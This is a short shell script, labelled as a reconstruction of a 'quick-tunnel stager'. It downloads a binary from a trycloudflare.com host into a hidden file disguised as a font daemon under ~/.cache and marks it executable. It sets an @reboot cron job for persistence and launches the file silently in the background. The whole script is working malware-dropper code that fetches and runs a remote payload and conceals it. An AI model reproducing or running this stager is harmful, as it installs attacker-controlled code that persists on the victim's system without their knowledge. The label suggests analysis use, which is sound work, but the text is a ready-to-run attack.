#!/bin/sh
# Reconstruction: quick-tunnel stager (Debian arch name, wget, u+x, cron).
BASE="https://cities-fancy-heard-ruled.trycloudflare.com/b"
DEST="$HOME/.cache/.fontd"

ARCH="$(dpkg --print-architecture 2>/dev/null || echo amd64)"
mkdir -p "$(dirname "$DEST")"
wget -q -O "$DEST" "$BASE/$ARCH" || exit 0
chmod u+x "$DEST"
(crontab -l 2>/dev/null; echo "@reboot $DEST >/dev/null 2>&1") | crontab -
nohup "$DEST" >/dev/null 2>&1 &
